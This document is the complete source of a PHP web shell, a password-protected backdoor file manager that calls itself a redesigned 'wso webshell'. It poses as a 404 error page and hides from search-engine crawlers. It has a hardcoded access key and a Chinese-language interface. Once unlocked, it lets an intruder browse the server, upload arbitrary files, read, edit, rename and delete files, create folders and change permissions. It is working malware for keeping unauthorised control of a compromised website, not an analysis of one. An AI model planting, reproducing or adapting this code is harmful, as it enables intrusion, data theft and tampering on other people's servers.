<?php 
error_reporting(0);
http_response_code(404);
$auth_key = "18376066808519";
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

$pass = false;
if (isset($_COOKIE['pw_name_36073'])) {
    if(($_COOKIE['pw_name_36073']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_36073'])) {
        if(($_POST['pw_name_36073']) == $auth_key) {
            setcookie("pw_name_36073", $_POST['pw_name_36073']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'><h3>Hello <br>Welcome to wso webshell redesignated by mIcHy AmRaNe</h3><br><input placeholder='password' type=password name='pw_name_36073' value='".$_GET['pw']."' style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'></form></pre>
<div class='view'><div class='plane main'><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div></div></div>
<style>body,html{background:#1a1a1a;overflow:hidden;width:100%;height:100%;position:absolute;z-index: -2;}.view{position:absolute;top:0;left:0;right:0;bottom:0;-webkit-perspective:400;perspective:400;z-index: -2;}.plane{width:120px;height:120px;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;position:absolute;z-index: -2;}.plane.main{position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;-webkit-transform:rotateX(60deg) rotateZ(-30deg);transform:rotateX(60deg) rotateZ(-30deg);-webkit-animation:rotate 20s infinite linear;animation:rotate 20s infinite linear;z-index: -2;}.plane.main .circle{width:120px;height:120px;position:absolute;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;border-radius:100%;box-sizing:border-box;box-shadow:0 0 60px #a10705,inset 0 0 60px #7a0000;z-index: -2;}.plane.main .circle::after,.plane.main .circle::before{content:'';display:block;position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:5%;height:5%;border-radius:100%;background:#5d0819;box-sizing:border-box;box-shadow:0 0 60px 2px #7a0000;z-index: -2;}.plane.main .circle::before{-webkit-transform:translateZ(-90px);transform:translateZ(-90px)}.plane.main .circle::after{-webkit-transform:translateZ(90px);transform:translateZ(90px)}.plane.main .circle:nth-child(1){-webkit-transform:rotateZ(72deg) rotateX(63.435deg);transform:rotateZ(72deg) rotateX(63.435deg)}.plane.main .circle:nth-child(2){-webkit-transform:rotateZ(144deg) rotateX(63.435deg);transform:rotateZ(144deg) rotateX(63.435deg)}.plane.main .circle:nth-child(3){-webkit-transform:rotateZ(216deg) rotateX(63.435deg);transform:rotateZ(216deg) rotateX(63.435deg)}.plane.main .circle:nth-child(4){-webkit-transform:rotateZ(288deg) rotateX(63.435deg);transform:rotateZ(288deg) rotateX(63.435deg)}.plane.main .circle:nth-child(5){-webkit-transform:rotateZ(360deg) rotateX(63.435deg);transform:rotateZ(360deg) rotateX(63.435deg)}@-webkit-keyframes rotate{0%{-webkit-transform:rotateX(0) rotateY(0) rotateZ(0);transform:rotateX(0) rotateY(0) rotateZ(0)}100%{-webkit-transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg);transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg)}}@keyframes rotate{0%{-webkit-transform:rotateX(0) rotateY(0) rotateZ(0);transform:rotateX(0) rotateY(0) rotateZ(0)}100%{-webkit-transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg);transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg)}}; h2{color:whitesmoke; font-weight:bold; text-decoration:underline;}</style>");
}
// ----


function juejiang_perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {// Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {// Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {// Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {// Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {// Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {// Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {// FIFO pipe
        $info = 'p';
    } else {// Unknown
        $info = 'u';
    }
// Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x' ) :
        (($perms & 0x0800) ? 'S' : '-'));

// Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x' ) :
        (($perms & 0x0400) ? 'S' : '-'));

// World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x' ) :
        (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

// ------------------------------------------------------
/**
 * 转化 \ 为 /
 */
function dir_path($path)
{
    $path = str_replace('\\', '/', $path);
    if (substr($path, -1) != '/') $path = $path . '/';
    return $path;
}

// ------------------------------------------------------

/** 取得站点根目录
 * @return array|string|string[]
 */
function document_root(){

    $php_self = dir_path($_SERVER["PHP_SELF"]);
    $script_filename = dir_path($_SERVER["SCRIPT_FILENAME"]);
    if (empty($_SERVER["PHP_SELF"]) or empty($_SERVER["SCRIPT_FILENAME"])){
        $do1 = dir_path($_SERVER["DOCUMENT_ROOT"]);
        $do = rtrim($do1,'/');
    }else{
        $do = str_replace(str_replace("//", "/", $php_self), "", str_replace("\\\\", "/", $script_filename));
    }
    if(empty($do)) $do = '/';
    return $do;
}
$document_root = document_root();
define('DOCUMENT_ROOT', $document_root);

// ------------------------------------------------------



$php_version = PHP_MAJOR_VERSION;
if($php_version<=7){
    if(get_magic_quotes_gpc()){
        foreach($_POST as $key=>$value){
            $_POST[$key] = stripslashes($value);
        }
    }
}

$Version = '404';
if(isset($_GET['path'])){
    $path = $_GET['path'];
}else{
    $path = getcwd();
}


echo '<!doctype html>
<html>
<head>
<title>&Error_404&</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
</head>';
?>

    <center>
        <style>
            body{background:#e6e6e6;line-height:1;color:#000;font-family:Comic Sans MS;width:60%;margin:0 auto;}
            table,th,td{border-collapse:collapse;background:transparent;font-size:13px;}
            input,textarea{}
            .table_home,.th_home,.td_home{color:grey;border:1px solid grey;}
            th{padding:10px;}
            .td_home{padding:7px;}
            a{color:#000; text-decoration:none;}
            textarea{width:100%;height:400px;}
            #content tr:hover{background-color:#cecece;text-shadow:0px 0px 10px #fff;color:#fff;}
            .dh a{ padding-left: 10px; padding-right: 10px; border-right: 1px solid #000;}
            .dh a:hover{ color: #f00;}
        </style>
<?php
echo '</head>
<body><b>
<H1><center><font color="red">'.$Version.'</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">

<tr><td>

<font ><center>PHP '.PHP_VERSION.' + '.$_SERVER ['SERVER_SOFTWARE'].' + '.PHP_OS.'</center></font><br>';
if(isset($_GET['path'])){
    $path = $_GET['path'];
}else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

$gen_link_url = '<a style="color:#0066FF" href="?ARRAY='.$ARRAY.'&path='.DOCUMENT_ROOT;
$gen_link_url .= '">根目录 ：    </a>&nbsp;';
echo $gen_link_url;

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<font color=#000>
<a href="?ARRAY='.$ARRAY.'&path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a style="color:#0066FF" href="?ARRAY='.$ARRAY.'&path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</font>
<br><br>
</td></tr><tr><td><center>';

if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">上传成功 :)</font><br /><br />';
    }else{
        echo '<font color="red">上传失败 </font><br /><br />';
    }
}
echo '</center><center><form enctype="multipart/form-data" method="POST"><font color="white"><input style="background:black;font-family: Comic Sans MS " type="file" name="file" />
<input type="submit" value="上传" />
</form></center>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td><center>当前文件 : ";
    echo $_GET['filesrc'];
    echo '</center></tr></td></table><br />';
    echo(' <textarea style="width: 100%;height: 400px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}
//Empety
elseif(isset($_GET['option']) && $_GET['opt'] != 'delete'){
// echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    echo '</table><br /><center>';
//Chmod
    if($_GET['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            $new_perm_o = $_POST['perm'];

            if(strlen($new_perm_o)<=3) $new_perm_o=str_pad($new_perm_o,3,'6',STR_PAD_LEFT);
            $new_perm_o=intval(str_pad($new_perm_o,4,'0',STR_PAD_LEFT),8);

            if(chmod($_POST['path'],$new_perm_o)){
                echo '<font color="green">更改权限成功！ </font><br />';
            }else{
                echo '<font color="red">更改权限错误！ </font><br />';
            }
        }

        $hell = $_GET['path'];
        $yeah = $_GET['name'];
        $patc = "$hell/$yeah";

        echo '<form method="POST"><br>
当前文件 : '.$patc.'<br><br>权限----'.substr(base_convert(@fileperms($patc),10,8),-4).'<br><br>
设置新权限 : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($patc)), -4).'" />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" />
</form>
<br>
<a href="?ARRAY='.$ARRAY.'&path='.$hell.'" style="display:block; width:100%;" title="反回">反回</a>
';

    }
//
    elseif($_GET['opt'] == 'btw'){
        $cwd = $_GET['path'];

        echo '<form action="?ARRAY='.$ARRAY.'&option&path='.$cwd.'&opt=delete&type=buat" method="POST">
新目录名 : <input name="name" type="text" size="20" value="Folder" />
<input type="hidden" name="path" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" />
</form>';
    }
//Rename file
    elseif($_GET['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">重命名成功! :)</font><br /><br />';
            }else{
                echo '<font color="red">重命名失败! :( </font><br /><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        $hell = $_GET['path'];
        $yeah = $_GET['name'];
        $patc = "$hell/$yeah";
        $new = $_POST['newname'];

        echo '<form method="POST">
新名称 : <input name="newname" type="text" size="20" value="'.$new.'" />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="rename">
<input type="submit" /><br><br>
<input type="button" value="反回" onClick="javascript:location.href=\'?ARRAY='.$ARRAY.'&path='.$hell.'\'">
</form>';
    }
//File baru
    elseif($_GET['opt'] == 'baru'){

        $hell = $_GET['path'];
        $yeah = $_GET['name'];
        $patc = "$hell/$yeah";
        $new = empty($_POST['newname'])?$_POST['ngaran1']:$_POST['newname'];
        $azz = $_POST['path'];
        $newz = $azz."/".$new;
        $new_fiel = $hell.'/'.$_POST['ngaran1'];
        if(!empty($_POST['ngaran1'])) echo "正在新建文件：{$new_fiel}<br><br>";
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">新建文件成功 [ '.$azz.' ]</font><br /><br />';
            }else{
                echo '<font color="red">新建文件失败 >:(</font><br /><br />';
            }
            fclose($fp);
        }

        echo '<form method="POST"> 新文件名 : <input name="ngaran1" type="text" size="20" value="'.$new.'" /><input type="submit" name="ngaran" /></form><br> ';

        $ho = $_POST['ngaran1'];

        if(isset($_POST['ngaran'])){
            echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$hell.'/'.$ho.'">
<input type="hidden" name="opt" value="edit">
<input type="submit"  />
</form>';
        }
    }
//Edited file
    elseif($_GET['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">编辑成功！ </font><br /><br />';
            }else{
                echo '<font color="red">编辑失败！</font><br /><br />';
            }
            fclose($fp);
        }
        $hell = $_GET['path'];
        $yeah = $_GET['name'];
        $patc = "$hell/$yeah";
        echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="edit"><br>
<input type="submit"  />
<br>
<br>
<input type="button" value="反回" onClick="javascript:location.href=\'?ARRAY='.$ARRAY.'&path='.$hell.'\'">

</form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
//Delete dir and file
    if(isset($_GET['option']) && $_GET['opt'] == 'delete'){

        $hell = $_GET['path'];
        $yeah = $_GET['name'];
        $patc = "$hell/$yeah";

//Delete dir
        if($_GET['type'] == 'dir'){

            if(rmdir($patc)){
                echo '<font color="green">删除成功！</font><br />';
            }else{
                echo '<font color="red#">删除失败!>:(</font><br />';
            }
        }
//buat folder
        if($_GET['type'] == 'buat'){
            $haaa = $_POST['path'];
            $heee = $_POST['name'];
            $hooo = "$haaa/$heee";
            $new = $haaa.'/'.htmlspecialchars($heee);
            if(!mkdir($new)){
                echo '<font color="red">新建目录失败!</font><br />';
            }else{
                echo '<font color="green">新建目录成功! >:)</font><br />';
            }
        }
//Delete file
        elseif($_GET['type'] == 'file'){

            $hell = $_GET['path'];
            $yeah = $_GET['name'];
            $patc = "$hell/$yeah";

            if(unlink($patc)){
                echo '<font color="green">文件删除成功</font><br />';
            }else{
                echo '<font color="red">文件删除失败</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    $pa = getcwd();
    echo ' <div id="content"><table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">

<tr>
<th class=th_home style="background:black;color:#fff;"><center>名称</center></th>
<th class=th_home style="background:black;color:#fff;" ><center>大小</center></th>
<th class=th_home style="background:black;color:#fff;" ><center>权限</center></th>
<th class=th_home style="background:black;color:#fff;" ><center>操作选项</center></th>
</tr>


 <tr>
<td class="td_home" align="center">
<a href="?ARRAY='.$ARRAY.'&path='.dirname($path).'" style="display:block; width:100%;" title="上一页">上一页</a>
</td><td class=td_home align=center>Size</td> <td class=td_home align=center>Chmod</td> <td class=td_home align=center> <a href="?option&ARRAY='.$ARRAY.'&path='.$path.'&opt=baru&name=new.php">+ 新建文件</a> | <a href="?option&ARRAY='.$ARRAY.'&path='.$path.'&opt=btw&type=dir">+ 新建目录</a> </td></tr>
';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "
<tr>
<td class=td_home> <img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='> <a href=\"?ARRAY={$ARRAY}&path=$path/$dir\">$dir</a></td>
<td class=td_home ><center>DIR</center></td>
<td class=td_home align=center>
<a href=\"?option&ARRAY={$ARRAY}&path=$path&opt=chmod&type=dir&name=$dir\" title='权限设置'>
";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo juejiang_perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

        echo "
</a>
</td>


<td class=td_home ><center>
<a href=\"?option&ARRAY={$ARRAY}&path=$path&opt=rename&type=dir&name=$dir\">重命名</a>
<a href=\"javascript:if(confirm('确实要删除吗?'))location='?option&ARRAY={$ARRAY}&path={$path}&opt=delete&type=dir&name={$dir}'\">删除</a>
</center></td>
</tr>";
    }
    echo '<br>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }


        echo "<tr>
<td class=td_home > <img src='data:image/png;base64,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'>

";
// <a href=\"?ARRAY={$ARRAY}&filesrc=$path/$file&path=$path\">$file</a>
        echo "
<a href=\"?option&ARRAY={$ARRAY}&path={$path}&opt=edit&type=file&name={$file}\">{$file}</a>
</td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home align='center'><a href=\"?option&ARRAY={$ARRAY}&path=$path&opt=chmod&type=file&name=$file\" title='权限设置'>";



        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo juejiang_perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</a></td>
<td class=td_home><center>
<a href=\"?option&ARRAY={$ARRAY}&path=$path&opt=edit&type=file&name=$file\">编辑</a>
<a href=\"?option&ARRAY={$ARRAY}&path=$path&opt=rename&type=file&name=$file&path=$path\">重命名</a>
<a href=\"javascript:if(confirm('确实要删除吗?'))location='?option&ARRAY={$ARRAY}&path={$path}&opt=delete&type=file&name={$file}'\">删除</a>
</center></td>
</tr>";
    }
    echo '</table>
</div>';
}
echo '<br><br><br><br></b>
</body> </html></body>
</html>';
die;
